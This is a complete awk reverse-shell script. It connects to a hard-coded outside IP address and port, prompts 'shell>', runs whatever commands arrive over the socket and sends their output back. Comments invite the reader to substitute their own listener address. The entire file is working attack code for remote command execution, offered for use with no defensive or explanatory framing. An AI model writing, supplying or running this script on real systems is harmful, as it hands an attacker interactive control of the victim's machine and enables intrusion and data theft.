#!/usr/bin/awk -f

BEGIN {
    # Set your LHOST and LPORT here
    LHOST = "107.175.243.19"   # Replace with your IP address
    LPORT = "51000"  	       # Replace with your port number

    # Create a socket connection
    s = "/inet/tcp/0/" LHOST "/" LPORT;

    while (1) {
        # Prompt for command input
        printf "shell> " |& s;

        # Read command from the socket
        s |& getline cmd;

        if (cmd) {
            # Execute the command and send output back
            while ((cmd |& getline output) > 0) {
                print output |& s;
            }
            close(cmd);
        }
    }
}
